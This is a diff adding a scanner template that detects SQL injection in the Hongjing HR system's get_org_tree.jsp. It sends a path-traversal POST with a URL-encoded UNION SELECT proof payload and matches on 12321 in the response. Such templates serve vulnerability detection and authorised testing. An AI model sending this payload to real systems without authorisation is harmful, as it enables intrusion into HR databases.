@@ -1,0 +1,36 @@
+id: hjhost-hcm-get-org-tree-sqli
+
+info:
+  name: 宏景人力资源管理系统 get_org_tree.jsp SQL注入漏洞
+  author: SleepingBag945
+  severity: high
+
+
+variables:
+  filename: "{{to_lower(rand_base(4))}}"
+  rboundary: "{{to_lower(rand_base(32))}}"
+
+http:
+  - raw:       
+      - |
+        POST /templates/attestation/../../kq/app_check_in/get_org_tree.jsp HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36
+        Content-Length: 133
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.9
+        Cache-Control: max-age=0
+        Connection: close
+        Content-Type: application/x-www-form-urlencoded
+        Cookie: JSESSIONID=E343A5DB5A1B3069FE78F2525E8FB871
+        Upgrade-Insecure-Requests: 1
+
+        params=%31%3d%30%20%75%6e%69%6f%6e%20%73%65%6c%65%63%74%20%31%2c%31%31%31%2a%31%31%31%2c%27%68%6a%73%6f%66%74%27%2c%34%2d%2d%2b
+
+    matchers-condition: and
+    matchers:
+      - type: dsl 
+        dsl:
+          - contains(body,"12321") && status_code == 200
+
